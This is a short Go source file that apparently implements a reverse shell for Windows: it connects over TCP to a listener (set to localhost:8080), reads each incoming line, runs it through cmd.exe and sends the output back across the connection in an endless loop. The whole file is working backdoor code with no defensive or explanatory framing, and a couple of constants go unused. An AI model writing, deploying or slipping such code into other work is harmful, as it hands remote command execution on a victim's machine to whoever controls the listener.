package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

const (
	//connection info
	connHost = "localhost"
	connPort = "8080"
	connType = "tcp"
	//command list
	exi   = "exit"
	hello = "hello"
)

func main() {
	conn, _ := net.Dial(connType, connHost+":"+connPort)
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')

		out, err := exec.Command("cmd.exe", "cmd /c "+strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
		fmt.Println(strings.TrimSuffix(message, "\n"))

	}
}
